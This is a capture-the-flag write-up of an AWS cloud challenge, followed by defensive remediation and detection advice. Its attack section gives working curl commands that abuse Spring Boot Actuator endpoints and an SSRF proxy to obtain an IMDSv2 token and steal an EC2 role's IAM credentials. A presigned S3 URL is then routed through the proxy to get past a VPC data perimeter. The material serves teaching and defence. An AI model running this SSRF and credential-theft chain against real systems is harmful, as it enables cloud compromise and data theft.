# Perimeter Leak

```
**Category:** Cloud Security / AWS
**Difficulty:** Medium
```


## Challenge Description
> "After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket. It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents." - Scott Piper

## Executive Summary
This challenge demonstrates a multi-stage attack against an AWS environment. The initial foothold was achieved by discovering an exposed Spring Boot Actuator endpoint protected only by basic authentication. Further enumeration revealed a custom proxy endpoint vulnerable to Server-Side Request Forgery (SSRF). This SSRF was leveraged to bypass IMDSv2 restrictions and exfiltrate the EC2 instance's temporary IAM credentials. Finally, to bypass the AWS Data Perimeter protecting the target S3 bucket, local AWS CLI tools were used to generate a presigned URL with the stolen credentials, which was then executed *through* the SSRF proxy to satisfy the bucket's VPC source restrictions.

![Perimeter_leak](Wiz_-Perimeter_Mindmap.png)

# Offensive Operations

## Initial Enumeration
The target was a Spring Boot application. Initial reconnaissance began by checking for exposed Actuator endpoints, a common misconfiguration in Spring applications.

Basic authentication (`ctf:88sPVWyC2P3p`) provided access to the root actuator directory.

```bash
curl -u ctf:88sPVWyC2P3p [https://challenge01.cloud-champions.com/actuator](https://challenge01.cloud-champions.com/actuator)
```

![Perimeter_leak](Wiz_-Perimeter_leak_actuator.png)


Reviewing the `/env` endpoint leaked sensitive environment variables, notably identifying the target S3 bucket: `BUCKET={"value":"challenge01-470f711"}`.

```bash
curl -u ctf:88sPVWyC2P3p [https://challenge01.cloud-champions.com/actuator/env](https://challenge01.cloud-champions.com/actuator/env)
```

![Perimeter_leak](Wiz_-Perimeter_leak_env.png)


To understand the application's attack surface, the `/mappings` endpoint was dumped and piped through `jq`. This revealed a custom route designed to accept a user-supplied URL.

```bash
curl -u ctf:88sPVWyC2P3p [https://challenge01.cloud-champions.com/actuator/mappings](https://challenge01.cloud-champions.com/actuator/mappings) | jq
```

[mappings.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Perimeter_leak/mappings.txt "Results")

The critical finding was the `/proxy` endpoint mapping to `challenge.Application#proxy(String)`. This indicated a potential SSRF vulnerability.



## SSRF & IMDSv2 Bypass
The immediate goal of an SSRF in AWS is to hit the Instance Metadata Service (IMDS) at `169.254.169.254`. An initial standard GET request resulted in a 401 Unauthorized, indicating that the instance enforced IMDSv2, which requires a session token.

```bash
curl -u ctf:88sPVWyC2P3p "[https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/](https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
# Result: HTTP error: 401 Unauthorized
```

Because the Spring Boot `/proxy` application forwarded HTTP headers to the destination, it was possible to manually negotiate an IMDSv2 token by passing the required `X-aws-ec2-metadata-token-ttl-seconds` header through the proxy.

```bash
TOKEN=$(curl -s -u ctf:88sPVWyC2P3p -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "[https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token](https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token)")
```

![Perimeter_leak](Wiz_-Perimeter_leak_v2.png)


With the token acquired, it was passed in subsequent requests to enumerate the IAM role attached to the EC2 instance.

```bash
curl -s -u ctf:88sPVWyC2P3p -H "X-aws-ec2-metadata-token: $TOKEN" "[https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/](https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
```

![Perimeter_leak](Wiz_-Perimeter_leak_role.png)


The role name was then appended to the path to extract the Access Key, Secret Key, and Session Token.

```bash
curl -s -u ctf:88sPVWyC2P3p -H "X-aws-ec2-metadata-token: $TOKEN" "[https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368](https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368)"
```

![Perimeter_leak](Wiz_-Perimeter_leak_scretes.png)



## The Data Perimeter Bypass
The stolen credentials were exported locally:

```bash
export AWS_ACCESS_KEY_ID="ASIARK7LBOHXFQMUISJC"
export AWS_SECRET_ACCESS_KEY="y1gZpTi68tuKSAylwV2UGHTjajSGq/gtQme1R0S3"
export AWS_SESSION_TOKEN="IQoJb3Jp..."
```

![Perimeter_leak](Wiz_-Perimeter_leak_sign.png)


Directly querying the S3 bucket locally with the AWS CLI would fail because of the **AWS Data Perimeter**. The bucket policy restricted access strictly to requests originating from the internal VPC (`aws:SourceVpc` condition).

To bypass this, the stolen credentials were used locally to generate a **Presigned URL**. This cryptographically signed URL grants temporary access to an object. By sending this URL back *through* the SSRF proxy, the actual HTTP GET request to S3 originated from the EC2 instance inside the perimeter, satisfying the bucket policy.

Initial attempts to guess the flag location (`flag.txt`, `flag.json`) returned 404 Not Found errors. 

To find the exact path, a request was routed through the proxy to the bucket root to list its contents.

```bash
curl -s -u ctf:88sPVWyC2P3p "[https://challenge01.cloud-champions.com/proxy?url=https://challenge01-470f711.s3.us-east-1.amazonaws.com/](https://challenge01.cloud-champions.com/proxy?url=https://challenge01-470f711.s3.us-east-1.amazonaws.com/)"
```
This revealed the true path of the flag: `private/flag.txt`. 

A final presigned URL was generated for the correct path, URL-encoded to ensure the proxy handled the query parameters correctly, and executed via the SSRF.

```bash
PRESIGNED_URL=$(aws s3 presign s3://challenge01-470f711/private/flag.txt --region us-east-1)
ENCODED_URL=$(jq -nr --arg url "$PRESIGNED_URL" '$url | @uri')
curl -s -u ctf:88sPVWyC2P3p "[https://challenge01.cloud-champions.com/proxy?url=$ENCODED_URL](https://challenge01.cloud-champions.com/proxy?url=$ENCODED_URL)"
```

![Perimeter_leak](Wiz_-Perimeter_leak_Flag.png)


This successfully extracted the flag from the bucket.



## Key Takeaways
1. **Actuator Security:** Spring Boot Actuator endpoints must be disabled in production or strictly secured behind robust authentication and network controls, not just basic auth.
2. **SSRF and Header Forwarding:** Proxies that forward client headers verbatim represent a severe risk in cloud environments, as they allow attackers to bypass IMDSv2 protections.
3. **Data Perimeters are not Silver Bullets:** While VPC endpoint restrictions (`aws:SourceVpc`) successfully blocked direct external use of the stolen IAM credentials, they were circumvented because the attacker maintained execution capabilities (SSRF) within the trusted perimeter. Presigned URLs effectively decouple the identity authentication (done locally) from the network authorization (done via the proxy).


# Defensive Operations 

To secure this environment and detect similar attacks, the following Blue Team strategies should be implemented:

### Application-Level Remediation
* **Secure Spring Boot Actuators:** Never expose sensitive endpoints like `/env`, `/mappings`, or `/threaddump` to the public internet. Use `management.endpoints.web.exposure.include=health,info` to limit exposure. Implement strict Role-Based Access Control (RBAC) via Spring Security rather than relying on global Basic Authentication.
* **Patch the SSRF:** The `/proxy` endpoint must implement strict URL allowlisting. It should never accept arbitrary URLs. 
* **Header Sanitization:** The proxy application must be configured to strip incoming client HTTP headers (especially custom headers like `X-aws-ec2-metadata-token`) before forwarding the request to the destination. This completely breaks the IMDSv2 bypass.

### Infrastructure-Level Remediation
* **Network Restrictions (IMDS):** Utilize local firewall rules (e.g., `iptables`) on the EC2 instance to restrict access to `169.254.169.254` exclusively to the root user or specific authorized service accounts, blocking the web server process from querying it entirely.
* **Principle of Least Privilege:** Ensure the IAM role attached to the EC2 instance (`challenge01-5592368`) only has the absolute minimum permissions required to function. If the app doesn't need to read the `private/` directory in S3, the IAM policy should explicitly deny it.

### Threat Detection & Monitoring
* **CloudTrail Analytics:** Monitor for unusual `sts:GetSessionToken` or `s3:ListBucket` API calls. A sudden burst of S3 enumeration queries (like guessing `flag.json`, `flag.txt`) from an EC2 role that normally only accesses specific application paths is a high-confidence indicator of compromise.
* **GuardDuty Alerts:** While the data perimeter blocked external access, GuardDuty can detect if the stolen credentials were used from an unexpected IP address (when the attacker attempted to use the AWS CLI locally before realizing the perimeter was in place).
* **WAF (Web Application Firewall):** Deploy AWS WAF rules to detect and block requests containing internal IP ranges (like `169.254.169.254`) in query parameters.